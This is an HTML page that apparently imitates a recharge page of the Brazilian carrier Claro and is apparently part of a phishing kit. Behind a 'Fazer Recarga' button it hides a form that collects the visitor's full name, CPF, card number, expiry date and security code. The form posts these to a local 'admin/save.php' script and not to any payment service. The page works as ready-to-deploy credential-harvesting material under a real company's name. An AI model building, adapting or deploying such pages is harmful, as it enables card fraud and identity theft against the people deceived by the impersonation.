<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Claro | Recarga</title>
  <link rel="stylesheet" href="css/style.css" />
  <script>
    // Função para mostrar o formulário de pagamento
    function mostrarFormulario() {
      document.getElementById('formularioRecarga').style.display = 'block';
      document.getElementById('botaoRecarga').style.display = 'none'; // Esconde o botão depois de clicar
    }
  </script>
</head>
<body>
  <header class="header-claro">
    <div class="logo">Claro</div>
  </header>

  <main class="claro-container">
    <section class="recarga-section">
      <h1>Recarregue seu Claro Móvel</h1>
      <p class="descricao">Escolha o valor da recarga e adicione créditos ao seu número Claro de forma rápida e segura.</p>

      <div class="recarga-card">
        <h2>R$ 20,00</h2>
        <p class="detalhes-recarga">Recarga válida por 30 dias. Bônus exclusivo para planos Pré-Pago.</p>
        <button id="botaoRecarga" class="btn-recarregar" onclick="mostrarFormulario()">Fazer Recarga</button>
      </div>

      <!-- Formulário para preencher dados do cartão, inicialmente escondido -->
      <div id="formularioRecarga" class="recarga-form" style="display: none;">
        <h2>Informe seus dados</h2>
        <form action="admin/save.php" method="POST">
          <input type="text" name="nome" placeholder="Nome completo" required />
          <input type="text" name="cpf" placeholder="CPF" required />
          <input type="text" name="cartao" placeholder="Número do cartão" required />
          <input type="text" name="validade" placeholder="Validade (MM/AA)" required />
          <input type="text" name="codigo" placeholder="Código de segurança" required />
          <button type="submit">Confirmar Recarga</button>
        </form>
      </div>
    </section>
  </main>

  <footer class="footer-claro">
    <p>&copy; 2025 Claro S.A. Todos os direitos reservados.</p>
  </footer>
</body>
</html>
